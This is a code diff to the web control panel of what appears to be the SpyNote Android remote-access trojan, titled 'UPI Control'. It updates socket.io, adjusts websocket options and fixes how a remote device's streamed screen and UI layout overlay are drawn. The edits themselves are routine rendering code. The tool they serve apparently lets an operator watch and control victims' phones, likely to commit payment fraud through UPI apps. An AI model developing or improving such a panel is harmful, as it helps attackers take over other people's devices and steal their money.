@@ -3,7 +3,7 @@
 <head>
     <title>📱 SpyNote - UPI Control</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
@@ -29,7 +29,7 @@
         }
         #screen-canvas { 
             width: 100%; height: 100%; background: #000; border-radius: 25px;
-            image-rendering: pixelated; image-rendering: -moz-crisp-edges; image-rendering: crisp-edges;
+            image-rendering: pixelated; image-rendering: -moz-crisp-edges;
         }
         #layout-overlay {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%; 
@@ -88,7 +88,7 @@
     </div>
 
     <script>
-        const socket = io({ transports: ['websocket'], upgrade: false });
+        const socket = io({ transports: ['websocket'] });
         let currentDevice = null;
         let deviceWidth = 1080, deviceHeight = 2400;
         let frameCount = 0, lastFrameTime = 0, avgFps = 0;
@@ -158,10 +158,14 @@
         }
 
         function renderLayoutOverlay(layout, rect) {
-            overlayCtx.clearRect(0, 0, canvas.width, canvas.height);
+            const overlayCanvas = document.getElementById('layout-overlay');
+            overlayCanvas.width = rect.width;
+            overlayCanvas.height = rect.height;
+            
+            overlayCtx.clearRect(0, 0, rect.width, rect.height);
             layoutElements = [];
             
-            layout.forEach((element, index) => {
+            layout.forEach((element) => {
                 const x = (element.bounds.left / deviceWidth) * rect.width;
                 const y = (element.bounds.top / deviceHeight) * rect.height;
                 const w = ((element.bounds.right - element.bounds.left) / deviceWidth) * rect.width;
